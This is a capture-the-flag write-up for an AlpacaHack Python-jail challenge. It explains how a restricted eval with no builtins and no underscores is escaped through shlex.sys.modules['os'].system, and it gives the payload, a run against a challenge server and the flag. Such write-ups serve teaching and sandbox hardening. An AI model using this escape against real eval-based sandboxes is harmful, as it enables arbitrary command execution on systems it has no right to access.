# [misc] You've Got Shlex

> With only the `shlex` module in scope and no `_` allowed, reach `os` through `shlex.sys.modules["os"]`.

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | misc (pyjail) |
| Difficulty | ★★☆☆☆ |
| Date | 2026-11-03 |
| Flag | `Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}` |

## Problem Statement

> And that's the only thing you get!
>
> `youve-got-shlex.tar.gz`

## TL;DR

- `eval(code, {"shlex": shlex, "__builtins__": {}})` with `code` ASCII and containing **no `_`** (blocks dunders). Only `shlex` is available; no builtins.
- `shlex` re-exports `shlex.sys` (the `sys` module — no underscore). `sys.modules` is the dict of imported modules, and `shlex` itself imported `os`, so:
  `shlex.sys.modules["os"].system("cat /flag.txt")` — all tokens underscore-free → runs `cat`, flag to stdout.

## Background Knowledge

### Module re-exports as a pivot

A sandbox that whitelists one module still leaks whatever that module imported. `shlex` does `import sys` (and `os`), exposing `shlex.sys`. From `sys.modules` you reach any already-loaded module by string key — no dunder, no builtins needed. Note `os` is not `shlex.os` here (3.14 doesn't bind it as an attribute), but it *is* in `sys.modules`.

## Solution

```python
shlex.sys.modules["os"].system("cat /flag.txt")
# ASCII, contains no "_"
```

See [`solve.py`](solve.py). Verified locally that `os` is in `shlex.sys.modules` and the call executes under the same restricted `eval`.

```bash
$ python3 solve.py 34.170.146.252 43709
Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}
```

## Tools Used

| Tool | Purpose |
|------|---------|
| Python stdlib `socket` | Send the one-line payload |

## Lessons Learned

- Whitelisting a single module is not a sandbox: its transitive imports (`shlex.sys` → `sys.modules["os"]`) restore full power without any dunder or builtin.

## Tags

`misc` `pyjail` `eval` `sys.modules` `module-reexport` `sandbox-escape`
